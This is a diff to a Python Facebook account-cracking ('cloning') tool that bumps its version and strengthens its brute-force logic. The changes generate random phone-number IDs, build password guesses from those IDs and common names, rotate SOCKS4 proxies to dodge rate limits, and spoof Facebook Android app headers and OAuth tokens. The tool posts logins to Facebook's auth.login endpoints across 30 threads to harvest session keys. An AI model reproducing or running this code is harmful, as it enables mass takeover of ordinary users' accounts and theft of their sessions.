@@ -45,7 +45,7 @@ logo=(f'''{B}
         {B}888   "   888 888  T88b   d88P Y88b  
         {warna}888       888 888   T88b d88P   Y88b 
 {warna}---------------------------------------------------{B}
-           Version      =  {C}0.0.4{B}
+           Version      =  {C}0.0.5{B}
            Devoloped    =  {C}ARIYAN-XD{B}
            Code by      = {C} DIPTO HIRA{B}
            Status       = {C} PERSONAL{B}
@@ -106,7 +106,7 @@ def BD_CLONING():
     mtd=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
     clear()
     for nmbr in range(limit):
-        nmp=''.join(random.choice(string.digits) for _ in range(7))
+        nmp=''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
     with tred(max_workers=30) as Dipto:
         tl=str(len(user))
@@ -116,7 +116,7 @@ def BD_CLONING():
         linex()
         for psx in user:
             ids=code+psx
-            passlist=['57575751','57273200','59039200']
+            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
             if mtd in ['01','1']:
             	Dipto.submit(method_crack,ids,passlist)
             elif mtd in ['02','2']:
@@ -199,14 +199,15 @@ def method_crack2(ids,passlist):
             sys.stdout.write('\r\r \033[1;37mCracking.. %s|M2|\033[1;32mOK:%s'%(loop,len(oks)))
             sys.stdout.flush()
             adid=str(uuid.uuid4())
-            device_id=str(uuid.uuid4())
             bld=random.choice([178366431,676379710])
+            nip=random.choice(proxsi)
+            proxs= {'http': 'socks4://'+nip}
             build=random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
             uaM2=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(6,13))}; SM-N9200 Build/{str(build)}676379710) [FBAN/FB4A;FBAV/38.0.0.9.43;FBBV/22849849;FBDM/'+'{density=2.0,width=1080,height=1080}'+';FBLC/en_US;FBCR/VIVO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9200;FBSV/11.2.4;nullFBCA/armeabi-v7a:armeabi;]'
             datax={'adid': adid, 'format': 'json', 'device_id': adid, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'fb_api_req_friendly_name': 'authenticate'}
             header={'User-Agent': ua(), 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '237'}
             url='https://api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header).json()
+            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
             #print(response)
             if 'session_key' in reqx:
                 try:
@@ -247,12 +248,14 @@ def method_crack3(ids,passlist):
             adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
             bld=random.choice([178366431,676379710])
+            nip=random.choice(proxsi)
+            proxs= {'http': 'socks4://'+nip}
             build=random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
             uam3=f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}; MIX Build/{str(build)}.{str(bld)}) [FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/'+'{density=2.0,width=720,height=1184}'+';FBLC/en_US;FBRV/85070460;FBCR/vodafone IN;FBMF/ulefone;FBBD/ulefone;FBPN/com.facebook.katana;FBDV/MIX;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
             datax={'locale': 'en_US', 'format': 'json', 'method': 'auth.login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1'}
             header={'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'b-api.facebook.com', 'User-Agent': uam3, 'priority': 'u=3,i', 'X-Fb-Http-Engine': 'Liger', 'X-Fb-Client-Ip': 'True', 'Content-Length': '2126'}
             url='https://b-api.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header).json()
+            reqx=requests.post(url,data=datax,headers=header,allow_redirects=False,proxies=proxs).json()
             #print(response)
             if 'session_key' in reqx:
                 try:
